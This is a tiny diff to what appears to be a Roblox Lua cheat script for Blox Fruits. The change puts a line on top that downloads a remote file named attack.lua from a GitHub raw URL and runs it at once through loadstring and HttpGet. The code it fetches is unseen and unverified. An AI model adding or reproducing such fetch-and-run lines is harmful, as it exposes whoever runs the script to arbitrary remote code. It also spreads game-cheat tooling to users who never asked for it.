@@ -1,4 +1,4 @@
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Gdfjffghhjkgghhhh/BloxFruitMain/refs/heads/main/attack.lua"))()
 do
   ply = game.Players
   plr = ply.LocalPlayer
